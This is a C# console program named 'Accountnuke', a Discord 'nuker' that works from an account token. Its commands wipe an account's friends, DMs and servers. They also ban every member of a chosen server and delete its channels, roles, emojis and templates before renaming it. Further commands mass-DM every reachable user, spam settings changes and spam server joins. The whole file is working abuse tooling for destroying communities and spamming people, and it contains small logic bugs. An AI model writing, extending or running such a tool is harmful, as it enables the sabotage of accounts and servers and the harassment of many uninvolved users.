using System;
using System.Threading;
using System.Drawing;
using Console = Colorful.Console;
using Discord;
using Discord.Gateway;
using System.Net;
using System.Linq;
using System.IO;

namespace Random_Unicode
{
    class Program
    {
        static void Main(string[] args)
        {
            string title = "Accountnuke | " + Environment.UserName;

            Console.Title = (title);
            Console.ForegroundColor = Color.DeepPink;
            Console.WriteLine(@"
            ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
            ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
            ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
            ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
            ██║ ╚████║╚██████╔╝██║  ██╗███████╗
            ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                         type help
            ");
            Console.ForegroundColor = Color.MediumPurple;

            Console.WriteLine("");
            Console.Write("> token: ");
            string token = Console.ReadLine();

            Console.WriteLine("");
            Console.Write("> token set as [" + token + "]");
            Console.WriteLine("");
            Console.Title = (title + " | " + token);
            DiscordClient client = new DiscordClient(token);

            for (int i = 0; i == 0;)
            {
                Console.WriteLine("");
                Console.Write("> ");
                string command = Console.ReadLine();

                switch (command)
                {

                    case "info":
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        Console.WriteLine("> user            | " + client.User.ToString());
                        Console.WriteLine("> userid          | " + client.User.Id);
                        Console.WriteLine("> user created at | " + client.User.CreatedAt);
                        Console.WriteLine("> email           | " + client.User.Email);

                        if (client.User.EmailVerified)
                        {
                            Console.WriteLine("> email verified  | Yes");
                        }
                        else
                        {
                            Console.WriteLine("> email Verified  | No");
                        }

                        if (client.User.TwoFactorAuth)
                        {
                            Console.WriteLine("> 2fa             | Yes");
                        }
                        else
                        {
                            Console.WriteLine("> 2fa             | No");
                        }

                        Console.WriteLine("> user type       | " + client.User.Type);
                        Console.WriteLine("> badge           | " + client.User.PublicBadges.ToString());
                        Console.WriteLine("> lang            | " + client.User.Language.ToString());
                        Console.WriteLine("> avatar url      | " + client.User.Avatar.Url);
                        int x = 0;
                        int y = 0;
                        foreach (var guild in client.GetGuilds())
                        {
                            y++;
                        }
                        foreach (var relationship in client.GetRelationships())
                        {
                            y++;
                        }
                        Console.WriteLine("> guilds          | " + x);
                        Console.WriteLine("> friends         | " + y);
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "user":
                        Console.WriteLine("");
                        client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                        Console.WriteLine("> set theme to light");
                        client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
                        Console.WriteLine("> set language to russian");
                        Console.WriteLine("");
                        foreach (var relationship in client.GetRelationships())
                        {
                            try
                            {
                                if (relationship.Type == RelationshipType.Friends)
                                    relationship.Remove();
                                Console.WriteLine($"> removed friend " + relationship.User.ToString());

                                if (relationship.Type == RelationshipType.IncomingRequest)
                                    relationship.Remove();
                                Console.WriteLine("> removed incoming");

                                if (relationship.Type == RelationshipType.OutgoingRequest)
                                    relationship.Remove();
                                Console.WriteLine("> removed outcoming");

                                if (relationship.Type == RelationshipType.Blocked)
                                    relationship.Remove();
                                Console.WriteLine("> removed blocked");
                            }
                            catch { }
                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> friends removed");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");

                        foreach (var dm in client.GetPrivateChannels())
                        {
                            try
                            {
                                dm.Delete();
                                Console.WriteLine($"dm {dm.Id} with {dm.Recipients.Count} user/s closed");
                            }
                            catch { }
                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> dms closed");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");

                        foreach (var guild in client.GetGuilds())
                        {
                            try
                            {
                                if (guild.Owner)
                                    guild.Delete();

                                else
                                    guild.Leave();
                                Console.WriteLine($"> left {guild}");

                                Thread.Sleep(100);
                            }
                            catch { }
                        }
                        
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> left guilds");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");
                        Console.Write("> status: ");
                        
                        string status = Console.ReadLine();
                        try
                        {
                            client.User.ChangeSettings(new UserSettingsProperties()
                            {
                                CustomStatus = new CustomStatus() { Text = status }
                            });
                            Console.WriteLine("> set status to " + status);
                            Console.WriteLine("");
                        }
                        catch { }
                        
                        Console.WriteLine("> also fuck massguild lol");
                        break;

                    case "server":
                        
                        DiscordSocketClient NukerClient = new DiscordSocketClient();
                        NukerClient.Login(token);
                        
                        Console.WriteLine("");
                        Console.Write("> serverid: ");
                        
                        ulong serverid = Convert.ToUInt64(Console.ReadLine());
                        DiscordGuild server = NukerClient.GetGuild(serverid);
                        SocketGuild socketserver = NukerClient.GetCachedGuild(serverid);
                        
                        Console.WriteLine("");

                        foreach (var user in socketserver.GetMembers())
                        {
                            if (user.User.Id != NukerClient.User.Id)
                            {
                                try
                                {
                                    user.Ban();
                                    Console.WriteLine("> banned " + user.User.ToString());
                                }
                                catch
                                { }
                            }

                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> members banned");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");
                        
                        var templates = server.GetTemplates();

                        if (templates.Any())
                        {
                            string code = templates.First().Code;
                            server.DeleteTemplate(code);
                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> template deleted");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");

                        foreach (var channel in server.GetChannels())
                        {
                            try
                            {
                                channel.Delete();
                                Console.WriteLine("> deleted " + channel.Name);
                            }
                            catch
                            { }
                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> channels deleted");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");

                        foreach (var role in server.GetRoles())
                        {
                            if (role.Id != serverid)
                            {
                                try
                                {
                                    role.Delete();
                                    Console.WriteLine("> deleted " + role.Name);
                                }
                                catch
                                { }
                            }
                        }
                        
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> roles deleted");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");

                        foreach (var emoji in server.Emojis)
                        {
                            emoji.Delete();
                            Console.WriteLine("> deleted " + emoji.Name);
                        }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> emojis removed");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");
                        Console.Write("> icon url: ");

                        string iconurl = Console.ReadLine();

                        if (!File.Exists("icon.png"))
                        {
                            using (var webclient = new WebClient())
                            {
                                webclient.DownloadFile(iconurl, "icon.png");
                                webclient.Dispose();
                            }
                        }

                        try
                        {
                            server.Modify(new GuildProperties() { Icon = Image.FromFile(@"icon.png") });
                        }
                        catch
                        { }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> icon changed");
                        Console.ForegroundColor = Color.MediumPurple;
                        Console.WriteLine("");
                        Console.Write("> name: ");

                        string name = Console.ReadLine();

                        try
                        {
                            server.Modify(new GuildProperties() { Name = name });
                        }
                        catch
                        { }

                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> name changed");
                        Console.ForegroundColor = Color.MediumPurple;
                        break; 

                    case "dmall":
                        Console.WriteLine("");
                        Console.Write("> enter message: ");
                        string text = Console.ReadLine();

                        DiscordSocketClient dmall = new DiscordSocketClient();
                        dmall.Login(token);
                        
                        foreach (var guild in dmall.GetCachedGuilds())
                        {
                            foreach (var member in guild.GetMembers())
                            {
                                if (member.User.Id != dmall.User.Id)
                                {
                                    dmall.CreateDM(member.User.Id);
                                }
                            }

                            foreach (var channel in dmall.GetPrivateChannels())
                            {
                                if (channel.Type == ChannelType.DM)
                                {
                                    dmall.SendMessage(channel.Id, text, false);
                                    Console.WriteLine("sent to " + String.Join(" ", channel.Recipients));
                                }
                            }
                        }
                        
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("> sent dm to everyone");
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "blink":
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        for (int b = 0; b == 0;)
                        {
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                            Console.WriteLine("> set theme to light");
                            client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
                            Console.WriteLine("> set language to russian");
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
                            Console.WriteLine("> set theme to dark");
                            client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Chinese });
                            Console.WriteLine("> set language to chinese");
                        }
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "joinspam":
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        Console.Write("> amount: ");
                        string amount = Console.ReadLine();
                        Console.Write("> invite: ");
                        string inv = Console.ReadLine();
                        int z = Convert.ToInt32(amount);
                        for (int k = 0; i < z; k++)
                        {
                            GuildInvite invite = client.JoinGuild(inv);
                            invite.Guild.Leave();
                        }
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "help":
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        Console.WriteLine("> info     | token info");
                        Console.WriteLine("> user     | nuke usertoken");
                        Console.WriteLine("> server   | nuke server ");
                        Console.WriteLine("> dmall    | dm everyone available");
                        Console.WriteLine("> blink    | spams random language / theme options");
                        Console.WriteLine("> joinspam | self explanatory");
                        Console.WriteLine("> help     | help screen");
                        Console.WriteLine("> credits  | credits");
                        Console.WriteLine("> exit     | closes the app");
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "credits":
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        Console.WriteLine("> ilinked | anarchy wrapper");
                        Console.WriteLine("> stanley | account ruiner");
                        Console.WriteLine("> mb      | server nuker");
                        Console.WriteLine("> hellsec | console idea");
                        Console.ForegroundColor = Color.MediumPurple;
                        break;

                    case "exit":
                        Console.WriteLine("");
                        Environment.Exit(0);
                        break;

                    default:
                        Console.ForegroundColor = Color.DeepPink;
                        Console.WriteLine("");
                        Console.WriteLine("> command not found");
                        Console.ForegroundColor = Color.MediumPurple;
                        break;
                }
            }
        }
    }
}
